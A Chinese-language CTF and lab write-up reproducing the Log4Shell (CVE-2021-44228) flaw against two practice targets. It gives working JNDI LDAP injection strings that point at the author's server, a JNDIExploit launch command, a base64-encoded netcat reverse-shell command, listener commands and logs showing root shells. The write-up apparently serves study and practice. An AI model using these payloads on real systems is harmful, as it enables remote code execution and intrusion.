# CVE-2021-44228（logj）

总结：这个漏洞可以导致服务器执行你的输入，这样，执行你的恶意代码，或者反弹shell就都可以了。

---

这个漏洞其实我不太理解。也就是漏洞原理，暂时学着网上的复现出来。

但是现在有那么一点的眉目，就是对某个带有漏洞的服务器，输入一串特殊的字符串，然后这串字符串在服务器被执行，执行结果就是，服务器按照我们输入的内容，如果我们输入恶意代码，就能控制服务器。

整个过程也较为麻烦，实验了很多次，后面是用xshell连接我的公网服务器，然后用宝塔面板进行上传文件，接着再执行相关的步骤。

---



第一个网站：

烽火台：https://hack.zkaq.cn/battle/target?id=5a768e0ca6938ffd

做题时目标服务器ip：59.63.166.75

第一步：你要先有这些文件。

但是主要就是一个文件，就是JNDIExploit-1.2-SNAPSHOT.jar，其他的没有用到。跟exploit.class没有关系，尽管输出有Exploit相关输出。

![image-20220819095336055](C:\Users\高传晔\Desktop\cve复现.assets\image-20220819095336055.png)

第二步：执行

```bash
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 124.222.52.101
```

![image-20220819095500396](C:\Users\高传晔\Desktop\cve复现.assets\image-20220819095500396.png)

第三步：监听12345端口：

![image-20220819095625101](C:/Users/%E9%AB%98%E4%BC%A0%E6%99%94/Desktop/cve%E5%A4%8D%E7%8E%B0.assets/image-20220819095625101.png)

第四步：注入payload

这里需要的payload是：

```bash
${jndi:ldap://124.222.52.101:1389/Basic/ReverseShell/124.222.52.101/12345}
```

注释：124.222.52.101是我的公网ip，1389是LDAP监听的端口，后面的/Basic/ReverseShell/我不理解，然后是我的公网ip，我想要反弹给我自己电脑shell的端口。

结果：

![image-20220819100851001](C:\Users\高传晔\Desktop\cve复现.assets\image-20220819100851001.png)

注入后：

![image-20220819101454421](C:\Users\高传晔\Desktop\cve复现.assets\image-20220819101454421.png)

拿到了shell。

显示的信息：

```bash
ubuntu@VM-12-10-ubuntu:/llll$ java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 124.222.52.101
[+] LDAP Server Start Listening on 1389...
[+] HTTP Server Start Listening on 8080...
[+] Received LDAP Query: Basic/ReverseShell/124.222.52.101/12345
[+] Paylaod: reverseshell
[+] IP: 124.222.52.101
[+] Port: 12345
[+] Sending LDAP ResourceRef result for Basic/ReverseShell/124.222.52.101/12345 with basic remote reference payload
[+] Send LDAP reference result for Basic/ReverseShell/124.222.52.101/12345 redirecting to http://124.222.52.101:8080/ExploitaHGZETaQqI.class
[+] New HTTP Request From /59.63.166.75:35534  /ExploitaHGZETaQqI.class
[+] Receive ClassRequest: ExploitaHGZETaQqI.class
[+] Response Code: 200
```

```bash
ubuntu@VM-12-10-ubuntu:/llll$ nc -lvnp 12345
Listening on 0.0.0.0 12345
Connection received on 59.63.166.75 52042
root@2edcae2c7a9a:/# 
```





第二个网站：

BugkuCtf：https://ctf.bugku.com/challenges/detail/id/340.html

做题时目标服务器ip：

```
http://114.67.175.224:12057/
```

第一步，第二步，第三步都一样。

第四步的payload不一样：

```
${jndi:ldap://124.222.52.101:1389/Basic/Command/Base64/bmMgMTI0LjIyMi41Mi4xMDEgMTIzNDUgLWUgL2Jpbi9zaA==}
```

注释：/Basic/Command/Base64/我不理解，bmMgMTI0LjIyMi41Mi4xMDEgMTIzNDUgLWUgL2Jpbi9zaA==是base64加密后的命令，解密过来就是：

```bash
nc 124.222.52.101 12345 -e /bin/sh
```

结果：

注入后：

![image-20220819101621278](C:\Users\高传晔\Desktop\cve复现.assets\image-20220819101621278.png)

显示的信息：

```
ubuntu@VM-12-10-ubuntu:/llll$ java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 124.222.52.101
[+] LDAP Server Start Listening on 1389...
[+] HTTP Server Start Listening on 8080...
[+] Received LDAP Query: Basic/Command/Base64/bmMgMTI0LjIyMi41Mi4xMDEgMTIzNDUgLWUgL2Jpbi9zaA==
[+] Paylaod: command
[+] Command: nc 124.222.52.101 12345 -e /bin/sh
[+] Sending LDAP ResourceRef result for Basic/Command/Base64/bmMgMTI0LjIyMi41Mi4xMDEgMTIzNDUgLWUgL2Jpbi9zaA== with basic remote reference payload
[+] Send LDAP reference result for Basic/Command/Base64/bmMgMTI0LjIyMi41Mi4xMDEgMTIzNDUgLWUgL2Jpbi9zaA== redirecting to http://124.222.52.101:8080/Exploitjx4hAUQven.class
[+] New HTTP Request From /114.67.175.224:44082  /Exploitjx4hAUQven.class
[+] Receive ClassRequest: Exploitjx4hAUQven.class
[+] Response Code: 200
[+] Received LDAP Query: Basic/Command/Base64/bmMgMTI0LjIyMi41Mi4xMDEgMTIzNDUgLWUgL2Jpbi9zaA==
[+] Paylaod: command
[+] Command: nc 124.222.52.101 12345 -e /bin/sh
[+] Sending LDAP ResourceRef result for Basic/Command/Base64/bmMgMTI0LjIyMi41Mi4xMDEgMTIzNDUgLWUgL2Jpbi9zaA== with basic remote reference payload
[+] Send LDAP reference result for Basic/Command/Base64/bmMgMTI0LjIyMi41Mi4xMDEgMTIzNDUgLWUgL2Jpbi9zaA== redirecting to http://124.222.52.101:8080/ExploitSmWaWE9phv.class
[+] New HTTP Request From /114.67.175.224:44082  /ExploitSmWaWE9phv.class
[+] Receive ClassRequest: ExploitSmWaWE9phv.class
[+] Response Code: 200

```



```bash
ubuntu@VM-12-10-ubuntu:/llll$ nc -lvnp 12345
Listening on 0.0.0.0 12345
Connection received on 114.67.175.224 43322

```

